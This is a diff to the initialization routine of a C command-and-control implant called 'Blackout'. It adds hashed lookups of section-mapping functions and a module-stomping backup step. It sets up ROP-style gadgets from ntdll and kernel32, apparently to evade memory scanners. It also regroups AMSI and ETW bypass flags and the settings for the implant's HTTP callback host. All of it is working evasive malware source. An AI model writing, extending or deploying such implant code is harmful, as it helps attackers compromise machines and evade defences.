@@ -92,6 +92,9 @@ FUNC VOID BlackoutInit(
     Instance()->Win32.RtlReAllocateHeap         = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlReAllocateHeap" ) );
     Instance()->Win32.RtlFreeHeap               = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlFreeHeap" ) );
 
+    Instance()->Win32.NtUnmapViewOfSection      = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtUnmapViewOfSection" ) );
+    Instance()->Win32.NtMapViewOfSection        = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtMapViewOfSection" ) );
+    Instance()->Win32.NtCreateSection           = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtCreateSection" ) );
     Instance()->Win32.TpReleaseCleanupGroupMembers = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "TpReleaseCleanupGroupMembers" ) );
     Instance()->Win32.NtFreeVirtualMemory       = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "NtFreeVirtualMemory" )  );
     Instance()->Win32.RtlCreateTimer            = LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "RtlCreateTimer" ) );
@@ -167,17 +170,22 @@ FUNC VOID BlackoutInit(
 
     /*============================[ Agent config initialization ]============================*/
 
-    if ( Param ) Instance()->StompArgs = Param;
+#ifdef BK_STOMP
+    CreateImplantBackup();
+#endif
 
-    Instance()->Session.WorkingHours = CONFIG_WRKHRS;
-    Instance()->Session.KillDate     = CONFIG_KILLDATE;
-    Instance()->Session.SleepTime    = CONFIG_SLEEP;
-    Instance()->Session.Jitter       = 0x00;
-    Instance()->Session.AgentId      = RandomNumber32();
-    Instance()->Session.AmsiBypass   = FALSE;
-    Instance()->Session.EtwBypass    = FALSE;
-    Instance()->Session.ProcessId    = C_U32( Instance()->Teb->ClientId.UniqueProcess );
-    Instance()->Session.ThreadId     = C_U32( Instance()->Teb->ClientId.UniqueThread );
+    Blackout().Gadgets.RetGadget        = FindNtTestAlertGadget( Instance()->Modules.Ntdll );
+    Blackout().Gadgets.NtContinueGadget = (UINT_PTR)LdrFuncAddr( Instance()->Modules.Ntdll, HASH_STR( "LdrInitializeThunk" ) ) + 19;
+    Blackout().Gadgets.JmpGadget        = FindJmpGadget( Instance()->Modules.Kernel32, 0x23 );
+    Instance()->Session.WorkingHours    = CONFIG_WRKHRS;
+    Instance()->Session.KillDate        = CONFIG_KILLDATE;
+    Instance()->Session.SleepTime       = CONFIG_SLEEP;
+    Instance()->Session.Jitter          = 0x00;
+    Instance()->Session.AgentId         = RandomNumber32();
+    Blackout().AmsiBypass               = FALSE;
+    Blackout().EtwBypass                = FALSE;
+    Instance()->Session.ProcessId       = C_U32( Instance()->Teb->ClientId.UniqueProcess );
+    Instance()->Session.ThreadId        = C_U32( Instance()->Teb->ClientId.UniqueThread );
 
     /*============================[ Machine recognition ]============================*/
 
@@ -197,10 +205,10 @@ FUNC VOID BlackoutInit(
     
     /*============================[ Http/s listener config ]============================*/
 
-    Instance()->Transport.Host      = CONFIG_HOST;
-    Instance()->Transport.Port      = CONFIG_PORT;
-    Instance()->Transport.UserAgent = CONFIG_USERAGENT;
-    Instance()->Transport.Secure    = CONFIG_SECURE;
+    Transport().Http.Host      = CONFIG_HOST;
+    Transport().Http.Port      = CONFIG_PORT;
+    Transport().Http.UserAgent = CONFIG_USERAGENT;
+    Transport().Http.Secure    = CONFIG_SECURE;
 
     /*============================[ Process Informations ]============================*/
 
